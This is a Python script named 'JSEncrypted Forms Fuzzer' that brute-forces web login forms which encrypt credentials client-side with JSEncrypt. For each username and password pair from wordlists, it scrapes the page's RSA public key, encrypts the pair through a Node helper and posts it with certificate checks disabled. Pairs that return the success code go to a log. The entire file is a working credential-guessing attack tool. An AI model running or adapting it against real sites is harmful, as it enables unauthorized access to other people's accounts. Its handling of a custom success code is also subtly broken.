import argparse
import os
import requests
import readline
import base64
from termcolor import colored
import re
import subprocess
import urllib.parse
import urllib3
import itertools
import threading
import time
import sys

done = False
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rBe Patient White Hat ;) ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!')

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
 banner = """
      _ ____  _____                             _           _
    | / ___|| ____|_ __   ___ _ __ _   _ _ __ | |_ ___  __| |
 _  | \___ \|  _| | '_ \ / __| '__| | | | '_ \| __/ _ \/ _` |
| |_| |___) | |___| | | | (__| |  | |_| | |_) | ||  __/ (_| |
 \___/|____/|_____|_| |_|\___|_|   \__, | .__/ \__\___|\__,_|
                                   |___/|_|
 _____                          _____
|  ___|__  _ __ _ __ ___  ___  |  ___|   _ ___________ _ __
| |_ / _ \| '__| '_ ` _ \/ __| | |_ | | | |_  /_  / _ \ '__|
|  _| (_) | |  | | | | | \__ \ |  _|| |_| |/ / / /  __/ |
|_|  \___/|_|  |_| |_| |_|___/ |_|   \__,_/___/___\___|_|
 """
author = """
   Author:  Yashar
   Twitter: yashar0x
   Github:  yashar0x
   Website: yashar.pro
"""
print (colored(banner, 'red'))
print (author)

parser = argparse.ArgumentParser()
parser.add_argument("url", help="Exact URL of the login page", type=str)
parser.add_argument("-u", "--usernames", help="Username Wordlist File", type=str)
parser.add_argument("-p", "--passwords", help="Password Wordlist File", type=str)
parser.add_argument("-uLabel", "--usernamelabel", help="The label of Username field, Default is: username", type=str)
parser.add_argument("-pLabel", "--passwordlabel", help="The lable of Password field, Default is: password", type=str)
parser.add_argument("-r", "--responsecode", help="Successful response code, Default is 200", type=str)
args = parser.parse_args()

if args.usernamelabel == None:
    args.usernamelabel = "username"
if args.passwordlabel == None:
    args.passwordlabel = "password"
if args.responsecode == None:
    args.responsecode = 200

with open(args.usernames, 'r') as ufile:
    usernames = ufile.readlines()

with open(args.passwords, 'r') as pfile:
    passwords = pfile.readlines()

def encryptor(publicKey, phrase):
    result = subprocess.run(["node", "js/jsencryptor.js", publicKey, phrase], stdout=subprocess.PIPE)
    output = result.stdout.decode("utf-8").strip()
    return(output)

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}

output_dir = os.path.join(os.path.dirname(__file__), "output")
filename = "log.txt"
counter = 1
while os.path.exists(os.path.join(output_dir, filename)):
    counter += 1
    filename = f"log_{counter}.txt"
output_path = os.path.join(output_dir, filename)
with open(output_path, "w") as f:
    f.write(f"\n\nTarget: {args.url}\n\n")

for username in usernames:
    t = threading.Thread(target=animate)
    t.start()
    for password in passwords:
        response = requests.get(args.url, verify = False)
        cookies = response.cookies
        if response.status_code == 200:
            publicKeyVal = re.compile('PUBLIC&#32;KEY-----&#10;(.*?)&#10;-----END')
            match = publicKeyVal.search(response.text)
            if match:
                publicKey = match.group(1)
                publicKey = publicKey.replace("&#10;", "")
            else:
                print('No match found for Public Key')
        else:
            print(f'Request failed with status code {response.status_code}')
        encryptedUsername = encryptor(publicKey,username)
        encryptedPassword = encryptor(publicKey,password)
        encryptedUsername = urllib.parse.quote(encryptedUsername, safe='')
        encryptedPassword = urllib.parse.quote(encryptedPassword, safe='')
        payload = {
            args.usernamelabel: encryptedUsername,
            args.passwordlabel: encryptedPassword,
        }
        response = requests.post(args.url, data=payload, cookies=cookies, headers=headers, verify=False)
        if response.status_code == args.responsecode:
            with open(output_path, 'a') as f:
               f.write(f"Username: {username}Password: {password}")
               f.write("-------------------------------------------------\n")

time.sleep(10)
done = True
with open(output_path, "r") as f:
    contents = f.read()
print(contents)
